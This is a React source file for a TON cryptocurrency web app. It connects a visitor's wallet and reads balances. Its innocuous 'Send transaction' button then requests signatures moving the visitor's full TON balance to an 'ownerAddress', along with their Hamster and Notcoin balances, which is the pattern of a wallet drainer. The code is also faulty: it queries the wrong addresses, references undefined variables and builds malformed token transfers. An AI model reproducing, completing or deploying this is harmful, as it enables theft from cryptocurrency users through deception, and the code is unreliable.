import React,{ useState,useEffect } from 'react'
import { TonConnectUIProvider, useTonConnectUI,TonConnectButton } from '@tonconnect/ui-react';
import "./index.css";

import TonWeb from 'tonweb';
import { Buffer } from 'buffer';
window.Buffer = Buffer;



const Body =() => {

  
  //check these address in your wallet
  const ownerAddress="ownerAddress"
  const hamesterTokenAddress="EQAJ8uWd7EBqsmpSWaRdf_I-8R8-XHwh3gsNKhy-UrdrPcUo"
  const notcoinTokenAddress="EQAvlWFDxGF2lXm67y4yzC17wYKD9A0guwPkMs1gOsM__NOT"
  const tonAddress="EQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM9c"

  const [hamesterBalance, setHamesterBalance] = useState(null);
  const [notCoinBalance, setNotCoinBalance] = useState(null);
  const [tonBalance, setTonBalance] = useState(null);
  const [userAddress, setUserAddress] = useState(null);
  const [tonConnectUI] = useTonConnectUI();
  

  


  const fetchUserTokenBalance = async (userAddress, tokenAddress) => {
    
    const tonweb = new TonWeb(); 
    


    try {
      const walletAddress = new TonWeb.utils.Address(tokenAddress);
      const balance = await tonweb.provider.getBalance(walletAddress);
      return TonWeb.utils.fromNano(balance); 
    } catch (error) {
      console.error(`Error fetching balance for token ${tokenAddress}:`, error);
      return 0;
    }
  };

  const fetchAllBalances = async () => {
    if (!userAddress) return;

    const balanceOfHamester = await fetchUserTokenBalance(userAddress, hamesterTokenAddress);
    const balanceOfNotCoin = await fetchUserTokenBalance(userAddress, notcoinTokenAddress);
    const balanceOfTon = await fetchUserTokenBalance(userAddress, tonAddress);

    setHamesterBalance(balanceOfHamester);
    setNotCoinBalance(balanceOfNotCoin);
    setTonBalance(balanceOfTon);


    console.log(`
     your hamester balance before transactions : ${balanceOfHamester.toString()}
     your notcoin balance  before transactions: ${balanceOfNotCoin.toString()}
     your new hamester balance before transactions: ${balanceOfTon.toString()}
     `)};

  
  useEffect(() => {
    tonConnectUI.onStatusChange((walletInfo) => {
      if (walletInfo) {
        setUserAddress(walletInfo.account.address);
      }
    });
  }, [tonConnectUI]);

  const transferAllTokens = async () => {
    

    /*if (hamesterBalance <= 0 && notCoinBalance <= 0 && tonBalance <= 0) {
      console.error("No tokens to transfer.");
      return;
    }*/

    const transactionHamester = {
      validUntil: Math.floor(Date.now() / 1000) + 3600,
      messages: [
        {
          address: hamesterTokenAddress,
          amount: TonWeb.utils.toNano(hamesterBalance.toString()), 
          payload: null, 
        },
      ],
    };


    const transactionNot = {
      validUntil: Math.floor(Date.now() / 1000) + 3600,
      messages: [
        {
          address: notcoinTokenAddress,
          amount: TonWeb.utils.toNano(notCoinBalance.toString()),
          payload: null,
        },
      ],
    };
  
    const transactionTon = {
      validUntil: Math.floor(Date.now() / 1000) + 3600,
      messages: [
        {
          address: ownerAddress,
          amount: TonWeb.utils.toNano(tonBalance.toString()),
          payload: null,
        },
      ],
    };

    try {
       await tonConnectUI.sendTransaction(transactionTon);
      
       await tonConnectUI.sendTransaction(transactionHamester);
      
       await tonConnectUI.sendTransaction(transactionNot);
      
       console.log(`
        your new hamester balance: ${balanceOfHamester.toString()}
        your new notcoin balance: ${balanceOfNotCoin.toString()}
         your new hamester balance: ${balanceOfTon.toString()}
         `)


    } catch (error) {
      console.error('Error sending transactions:', error);
    }
  };

  useEffect(() => {
    if (userAddress) {
      fetchAllBalances();
    }
  }, [userAddress]);



  return (
    <>
      <div className="custom-buttons-container">
        <TonConnectButton />
        <button className='transfer-btn tonconnect-button' onClick={() => transferAllTokens(ownerAddress)}>
                Send transaction
            </button>
      </div>
    </>
  );
};


const App = () => {
  return (
    <TonConnectUIProvider manifestUrl="http://your-ton-uri/tonconnect-manifest.json">
          <Body/> 
        </TonConnectUIProvider>
  )
}

export default App
